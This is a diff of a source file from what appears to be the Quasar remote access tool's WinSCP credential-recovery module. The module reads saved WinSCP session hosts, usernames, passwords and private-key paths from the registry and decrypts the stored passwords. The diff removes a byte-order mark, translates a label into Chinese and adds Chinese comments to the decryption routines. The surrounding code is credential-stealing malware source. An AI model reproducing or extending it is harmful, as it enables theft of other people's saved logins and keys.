@@ -1,4 +1,4 @@
-﻿using Microsoft.Win32;
+using Microsoft.Win32;
 using Quasar.Client.Extensions;
 using Quasar.Client.Helper;
 using Quasar.Common.Models;
@@ -37,7 +37,7 @@ namespace Quasar.Client.Recovery.FtpClients
                             host += ":" + accountKey.GetValueSafe("PortNumber", "22");
 
                             if (string.IsNullOrEmpty(password) && !string.IsNullOrEmpty(privateKeyFile))
-                                password = string.Format("[PRIVATE KEY LOCATION: \"{0}\"]", Uri.UnescapeDataString(privateKeyFile));
+                                password = string.Format("[私钥位置: \"{0}\"]", Uri.UnescapeDataString(privateKeyFile));
 
                             data.Add(new RecoveredAccount
                             {
@@ -57,6 +57,11 @@ namespace Quasar.Client.Recovery.FtpClients
             }
         }
 
+        /// <summary>
+        /// 解密下一个字符
+        /// </summary>
+        /// <param name="list">字符串列表</param>
+        /// <returns>解密后的整数值</returns>
         private int dec_next_char(List<string> list)
         {
             int a = int.Parse(list[0]);
@@ -65,10 +70,18 @@ namespace Quasar.Client.Recovery.FtpClients
             return f;
         }
 
+        /// <summary>
+        /// WinSCP解密方法
+        /// </summary>
+        /// <param name="user">用户名</param>
+        /// <param name="pass">密码</param>
+        /// <param name="host">主机</param>
+        /// <returns>解密后的密码</returns>
         private string WinSCPDecrypt(string user, string pass, string host)
         {
             try
             {
+                // 检查输入参数是否为空
                 if (user == string.Empty || pass == string.Empty || host == string.Empty)
                 {
                     return "";
